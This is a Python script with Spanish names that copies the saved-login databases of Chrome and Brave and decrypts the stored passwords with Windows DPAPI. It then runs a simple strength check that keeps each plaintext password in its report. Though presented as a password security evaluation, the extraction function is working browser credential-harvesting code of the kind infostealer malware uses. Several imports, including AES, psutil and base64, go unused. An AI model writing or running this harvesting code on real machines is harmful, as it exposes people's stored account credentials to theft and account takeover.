import os
import base64
import json
import shutil
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import psutil
from datetime import datetime

def obtener_contraseñas_navegadores():
    """Obtiene contraseñas almacenadas en Google Chrome."""
    contraseñas = []

    rutas_posibles = [
        os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data'),
        os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data')
    ]

    for ruta in rutas_posibles:
        if os.path.exists(ruta):
            try:
                ruta_temp = os.path.expanduser("~\\AppData\\Local\\Temp\\LoginDataTemp.db")
                shutil.copyfile(ruta, ruta_temp)

                conn = sqlite3.connect(ruta_temp)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                for fila in cursor.fetchall():
                    sitio, usuario, contraseña_encriptada = fila
                    try:
                        contraseña = win32crypt.CryptUnprotectData(contraseña_encriptada, None, None, None, 0)[1].decode()
                    except Exception:
                        contraseña = "No se pudo descifrar"

                    contraseñas.append({
                        'sitio': sitio,
                        'usuario': usuario,
                        'contraseña': contraseña
                    })

                cursor.close()
                conn.close()
                os.remove(ruta_temp)
            except Exception as e:
                print(f"[ERROR] Falló al obtener contraseñas de {ruta}: {e}")

    return contraseñas

def evaluar_contraseñas(lista_contraseñas):
    """Evalúa contraseñas y genera reporte de seguridad."""
    resultados = []

    for entrada in lista_contraseñas:
        contraseña = entrada['contraseña']
        evaluacion = {
            'sitio': entrada['sitio'],
            'usuario': entrada['usuario'],
            'contraseña': contraseña,
            'longitud': len(contraseña),
            'es_segura': False,
            'motivo': ''
        }

        if len(contraseña) < 8:
            evaluacion['motivo'] = "Contraseña muy corta"
        elif contraseña.isnumeric():
            evaluacion['motivo'] = "Solo números"
        elif contraseña.isalpha():
            evaluacion['motivo'] = "Solo letras"
        else:
            evaluacion['es_segura'] = True
            evaluacion['motivo'] = "Segura"

        resultados.append(evaluacion)

    return resultados
